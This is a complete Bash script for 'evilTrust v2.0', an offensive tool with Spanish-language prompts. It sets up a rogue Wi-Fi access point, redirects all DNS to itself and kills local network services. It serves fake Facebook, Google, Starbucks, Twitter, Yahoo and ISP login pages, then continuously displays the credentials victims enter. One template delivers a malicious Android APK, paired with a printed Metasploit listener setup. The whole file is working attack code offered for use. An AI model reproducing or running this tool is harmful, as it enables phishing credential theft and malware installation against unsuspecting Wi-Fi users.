#!/bin/bash

# evilTrust v2.0, Author @s4vitar (Marcelo Vázquez)

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
	rm dnsmasq.conf hostapd.conf 2>/dev/null
	rm -r iface 2>/dev/null
	find \-name datos-privados.txt | xargs rm 2>/dev/null
	sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
	iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
	ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
	tput cnorm; service network-manager restart
	exit 0
}

function banner(){
echo -e "\n${redColour}╱╱╱╱╱╱╱╭┳━━━━╮╱╱╱╱╱╱╭╮"
sleep 0.05
echo -e "╱╱╱╱╱╱╱┃┃╭╮╭╮┃╱╱╱╱╱╭╯╰╮"
sleep 0.05
echo -e "╭━━┳╮╭┳┫┣╯┃┃┣┻┳╮╭┳━┻╮╭╯"
sleep 0.05
echo -e "┃┃━┫╰╯┣┫┃╱┃┃┃╭┫┃┃┃━━┫┃   ${endColour}${yellowColour}(${endColour}${grayColour}Hecho por ${endColour}${blueColour}s4vitar - ${endColour}${purpleColour}Eso le metes un nmap y pa' dentro${endColour}${yellowColour})${endColour}${redColour}"
sleep 0.05
echo -e "┃┃━╋╮╭┫┃╰╮┃┃┃┃┃╰╯┣━━┃╰╮"
sleep 0.05
echo -e "╰━━╯╰╯╰┻━╯╰╯╰╯╰━━┻━━┻━╯${endColour}"
sleep 0.05
}

function dependencies(){
	sleep 1.5; counter=0
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...\n"
	sleep 1

	dependencias=(php dnsmasq hostapd)

	for programa in "${dependencias[@]}"; do
		if [ "$(command -v $programa)" ]; then
			echo -e ". . . . . . . . ${blueColour}[V]${endColour}${grayColour} La herramienta${endColour}${yellowColour} $programa${endColour}${grayColour} se encuentra instalada"
			let counter+=1
		else
			echo -e "${redColour}[X]${endColour}${grayColour} La herramienta${endColour}${yellowColour} $programa${endColour}${grayColour} no se encuentra instalada"
		fi; sleep 0.4
	done

	if [ "$(echo $counter)" == "3" ]; then
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Comenzando...\n"
		sleep 3
	else
		echo -e "\n${redColour}[!]${endColour}${grayColour} Es necesario contar con las herramientas php, dnsmasq y hostapd instaladas para ejecutar este script${endColour}\n"
		tput cnorm; exit
	fi
}

function getCredentials(){

	tput civis; while true; do
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		find \-name datos-privados.txt | xargs cat 2>/dev/null
		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		sleep 3; clear
	done
}

function startAttack(){
	clear; if [[ -e credenciales.txt ]]; then
		rm -rf credenciales.txt
	fi

	echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Listando interfaces de red disponibles...${endColour}"; sleep 1

	# Si la interfaz posee otro nombre, cambiarlo en este punto (consideramos que se llama wlan0 por defecto)
	airmon-ng start wlan0 > /dev/null 2>&1; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
	counter=1; for interface in $(cat iface); do
		echo -e "\t\n${blueColour}$counter.${endColour}${yellowColour} $interface${endColour}"; sleep 0.26
		let counter++
	done; tput cnorm
	checker=0; while [ $checker -ne 1 ]; do
		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz (Ej: wlan0mon): ${endColour}" && read choosed_interface

		for interface in $(cat iface); do
			if [ "$choosed_interface" == "$interface" ]; then
				checker=1
			fi
		done; if [ $checker -eq 0 ]; then echo -e "\n${redColour}[!]${endColour}${yellowColour} La interfaz proporcionada no existe${endColour}"; fi
	done

	rm iface 2>/dev/null
	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar (Ej: wifiGratis):${endColour} " && read -r use_ssid
	echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} " && read use_channel; tput civis
	echo -e "\n${redColour}[!] Matando todas las conexiones...${endColour}\n"
	sleep 2
	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
	sleep 5

	echo -e "interface=$choosed_interface\n" > hostapd.conf
	echo -e "driver=nl80211\n" >> hostapd.conf
	echo -e "ssid=$use_ssid\n" >> hostapd.conf
	echo -e "hw_mode=g\n" >> hostapd.conf
	echo -e "channel=$use_channel\n" >> hostapd.conf
	echo -e "macaddr_acl=0\n" >> hostapd.conf
	echo -e "auth_algs=1\n" >> hostapd.conf
	echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf

	echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando interfaz $choosed_interface${endColour}\n"
	sleep 2
	echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
	hostapd hostapd.conf > /dev/null 2>&1 &
	sleep 6

	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}"
	echo -e "interface=$choosed_interface\n" > dnsmasq.conf
	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
	echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
	echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
	echo -e "server=8.8.8.8\n" >> dnsmasq.conf
	echo -e "log-queries\n" >> dnsmasq.conf
	echo -e "log-dhcp\n" >> dnsmasq.conf
	echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
	echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf

	ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
	sleep 1
	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	sleep 1
	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
	sleep 5

	# Array de plantillas
	plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)

	tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}\n\n"
	echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, all_in_one, optimumwifi):${endColour} " && read template

	check_plantillas=0; for plantilla in "${plantillas[@]}"; do
		if [ "$plantilla" == "$template" ]; then
			check_plantillas=1
		fi
	done

	if [ "$template" == "cliqq-payload" ]; then
		check_plantillas=2
	fi

	if [ $check_plantillas -eq 1 ]; then
		tput civis; pushd $template > /dev/null 2>&1
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 2
		popd > /dev/null 2>&1; getCredentials
	elif [ $check_plantillas -eq 2 ]; then
		tput civis; pushd $template > /dev/null 2>&1
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 2
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configura desde otra consola un Listener en Metasploit de la siguiente forma:${endColour}"
		for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		cat msfconsole.rc
		for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		echo -e "\n${redColour}[!] Presiona <Enter> para continuar${endColour}" && read
		popd > /dev/null 2>&1; getCredentials
	else
		tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Usando plantilla personalizada...${endColour}"; sleep 1
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} $template${endColour}\n"; sleep 1
		pushd $template > /dev/null 2>&1
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 2
		popd > /dev/null 2>&1; getCredentials
	fi
}

function helpPanel(){
	echo -e "\n${redColour}╱╱╱╱╱╱╱╭┳━━━━╮╱╱╱╱╱╱╭╮"
	sleep 0.05
	echo -e "╱╱╱╱╱╱╱┃┃╭╮╭╮┃╱╱╱╱╱╭╯╰╮"
	sleep 0.05
	echo -e "╭━━┳╮╭┳┫┣╯┃┃┣┻┳╮╭┳━┻╮╭╯"
	sleep 0.05
	echo -e "┃┃━┫╰╯┣┫┃╱┃┃┃╭┫┃┃┃━━┫┃   ${endColour}${yellowColour}(${endColour}${grayColour}Hecho por ${endColour}${blueColour}s4vitar${endColour}${yellowColour})${endColour}${redColour}"
	sleep 0.05
	echo -e "┃┃━╋╮╭┫┃╰╮┃┃┃┃┃╰╯┣━━┃╰╮"
	sleep 0.05
	echo -e "╰━━╯╰╯╰┻━╯╰╯╰╯╰━━┻━━┻━╯${endColour}"
	echo -e "\n${grayColour}Uso:${endColour}"
	echo -e "\t${redColour}[-m]${endColour}${blueColour} Modo de ejecución${endColour}${yellowColour} (terminal|gui)${endColour}${purpleColour} [-m terminal | -m gui]${endColour}"
	echo -e "\t${redColour}[-h]${endColour}${blueColour} Mostrar este panel de ayuda${endColour}\n"
	exit 1
}

function guiMode(){
	whiptail --title "evilTrust - by S4vitar" --msgbox "Bienvenido a evilTrust, una herramienta ofensiva ideal para desplegar un Rogue AP a tu gusto." 8 78
	whiptail --title "evilTrust - by S4vitar" --msgbox "Deja que compruebe que cuentas con todos los programas necesarios antes de empezar..." 8 78

	tput civis; dependencias=(php dnsmasq hostapd)

        counter_dep=0; for programa in "${dependencias[@]}"; do
                if [ "$(command -v $programa)" ]; then
                        let counter_dep+=1
                fi; sleep 0.4
        done

        if [ $counter_dep -eq "3" ]; then
		whiptail --title "evilTrust - by S4vitar" --msgbox "Perfecto, parece ser que cuentas con todo lo necesario..." 8 78
                sleep 3
        else
		whiptail --title "evilTrust - by S4vitar" --msgbox "Se ve que te faltan algunas dependencias, necesito que cuentes con las utilidades php, dnsmasq y hostapd instaladas" 8 78
                exit 1
        fi

	if [[ -e credenciales.txt ]]; then
                rm -rf credenciales.txt
        fi

	whiptail --title "evilTrust - by S4vitar" --msgbox "A continuación, te voy a listar tus interfaces de red disponibles, necesitaré que escojas aquella que acepte el modo monitor" 8 78

	interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
        counter=1; for interface in $(cat iface); do
                let counter++
        done
        checker=0; while [ $checker -ne 1 ]; do
		choosed_interface=$(whiptail --inputbox "Interfaces de red disponibles:\n\n$(ifconfig | cut -d ' ' -f 1 | xargs | tr -d ':' | tr ' ' '\n' | while read line; do echo "[*] $line"; done)" 13 78 --title "evilTrust - Interfaces de red" 3>&1 1>&2 2>&3)
                for interface in $(cat iface); do
                        if [ "$choosed_interface" == "$interface" ]; then
                                checker=1
                        fi
                done; if [ $checker -eq 0 ]; then whiptail --title "evilTrust - Error en la selección de interfaz" --msgbox "La interfaz proporcionada no existe, vuelve a introducir la interfaz y asegúrate de que sea correcta" 8 78; fi
        done

	whiptail --title "evilTrust - by S4vitar" --msgbox "A continuación se va a configurar la interfaz $choosed_interface en modo monitor..." 8 78
	airmon-ng start $choosed_interface > /dev/null 2>&1; choosed_interface="${choosed_interface}mon"

	rm iface 2>/dev/null
	use_ssid=$(whiptail --inputbox "Introduce el nombre del punto de acceso a utilizar (Ej: wifiGratis):" 8 78 --title "evilTrust - by S4vitar" 3>&1 1>&2 2>&3)
	whiptail --title "evilTrust - by S4vitar" --checklist \
	"Selecciona el canal bajo el cual quieres que el punto de acceso opere" 20 78 12 \
	1 "(Usar este canal) " OFF \
	2 "(Usar este canal) " OFF \
        3 "(Usar este canal) " OFF \
        4 "(Usar este canal) " OFF \
        5 "(Usar este canal) " OFF \
        6 "(Usar este canal) " OFF \
        7 "(Usar este canal) " OFF \
        8 "(Usar este canal) " OFF \
        9 "(Usar este canal) " OFF \
        10 "(Usar este canal) " OFF \
        11 "(Usar este canal) " OFF \
	12 "(Usar este canal) " OFF 2>use_channel

	use_channel=$(cat use_channel | tr -d '"'); rm use_channel

	whiptail --title "evilTrust - by S4vitar" --msgbox "Perfecto, voy a crearte unos archivos de configuración para desplegar el ataque..." 8 78

	tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando... (Este proceso tarda unos segundos)${endColour}"
        sleep 2
        killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
        sleep 5

        echo -e "interface=$choosed_interface\n" > hostapd.conf
        echo -e "driver=nl80211\n" >> hostapd.conf
        echo -e "ssid=$use_ssid\n" >> hostapd.conf
        echo -e "hw_mode=g\n" >> hostapd.conf
        echo -e "channel=$use_channel\n" >> hostapd.conf
        echo -e "macaddr_acl=0\n" >> hostapd.conf
        echo -e "auth_algs=1\n" >> hostapd.conf
        echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf

        sleep 2
        hostapd hostapd.conf > /dev/null 2>&1 &
        sleep 6

        echo -e "interface=$choosed_interface\n" > dnsmasq.conf
        echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
        echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
        echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
        echo -e "server=8.8.8.8\n" >> dnsmasq.conf
        echo -e "log-queries\n" >> dnsmasq.conf
        echo -e "log-dhcp\n" >> dnsmasq.conf
        echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
        echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf

        ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
        sleep 1
        route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
        sleep 1
        dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
        sleep 5

        # Array de plantillas
        plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)

	whiptail --title "evilTrust - by S4vitar" --msgbox "¡Listo!, hora de escoger tu plantilla" 8 78

        whiptail --title "evilTrust - by S4vitar" --checklist \
        "Selecciona la plantilla que desees utilizar" 17 110 12 \
        facebook-login "Plantilla de inicio de sesión de Facebook" OFF \
        google-login "Plantilla de inicio de sesión de Google" OFF \
        starbucks-login "Plantilla de inicio de sesión de Starbucks" OFF \
        twitter-login "Plantilla de inicio de sesión de Twitter" OFF \
        yahoo-login "Plantilla de inicio de sesión de yahoo" OFF \
        all_in_one "Plantilla todo en uno (múltiples portales centralizados)" OFF \
        cliqq-payload "Plantilla con despliege de APK malicioso" OFF \
        optimumwifi "Plantilla de inicio de sesión para el uso de WiFi (Selección de ISP)" OFF 2>template

	template=$(cat template | tr -d '"'); rm template

        check_plantillas=0; for plantilla in "${plantillas[@]}"; do
                if [ "$plantilla" == "$template" ]; then
                        check_plantillas=1
                fi
        done

        if [ "$template" == "cliqq-payload" ]; then
                check_plantillas=2
        fi; clear

        if [ $check_plantillas -eq 1 ]; then
		whiptail --title "evilTrust - by S4vitar" --msgbox "¡Listos para la batalla!, en breve el punto de acceso estará montado y será cuestión de esperar a que tus víctimas se conecten" 8 78
                tput civis; pushd $template > /dev/null 2>&1
                php -S 192.168.1.1:80 > /dev/null 2>&1 &
                sleep 2
                popd > /dev/null 2>&1; getCredentials
        elif [ $check_plantillas -eq 2 ]; then
		whiptail --title "evilTrust - by S4vitar" --msgbox "¡Listos para la batalla!, en breve el punto de acceso estará montado y será cuestión de esperar a que tus víctimas se conecten" 8 78
                tput civis; pushd $template > /dev/null 2>&1
                php -S 192.168.1.1:80 > /dev/null 2>&1 &
                sleep 2
		whiptail --title "evilTrust - by S4vitar" --msgbox "Configura desde otra consola un Listener en Metasploit de la siguiente forma:\n\n$(cat msfconsole.rc)" 15 78
                popd > /dev/null 2>&1; getCredentials
	else
		whiptail --title "evilTrust - by S4vitar" --msgbox "Veo que prefieres usar tu propia plantilla, sabia elección :)" 8 78
		whiptail --title "evilTrust - by S4vitar" --msgbox "¡Pues vamos a ello!" 8 78
                pushd $template > /dev/null 2>&1
                php -S 192.168.1.1:80 > /dev/null 2>&1 &
                sleep 2
                popd > /dev/null 2>&1; getCredentials
        fi
}

# Main Program

if [ "$(id -u)" == "0" ]; then
	declare -i parameter_enable=0; while getopts ":m:h:" arg; do
		case $arg in
			m) mode=$OPTARG && let parameter_enable+=1;;
			h) helpPanel;;
		esac
	done

	if [ $parameter_enable -ne 1 ]; then
		helpPanel
	else
		if [ "$mode" == "terminal" ]; then
			tput civis; banner
			dependencies
			startAttack
		elif [ "$mode" == "gui" ]; then
			guiMode
		else
			echo -e "Modo no conocido"
			exit 1
		fi
	fi
else
	echo -e "\n${redColour}[!] Es necesario ser root para ejecutar la herramienta${endColour}"
	exit 1
fi
